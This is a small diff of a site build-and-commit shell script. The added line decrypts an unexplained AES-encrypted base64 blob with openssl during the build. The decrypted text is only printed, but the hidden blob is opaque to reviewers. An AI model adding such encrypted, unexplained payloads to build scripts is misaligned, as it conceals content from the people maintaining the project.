@@ -4,6 +4,7 @@ echo "Recursively delete .DS_Store files"
 find . -type f -name '*.DS_Store' -ls -delete
 
 rake generate
+echo "U2FsdGVkX18gYOtcDP6leOUaAQiGLA1NDdToWGffCZI=" | openssl enc -aes-256-cbc -d -a
 git add -A -f *
 git commit -a -S -m 'auto update signed'
 wget -q --spider http://google.com
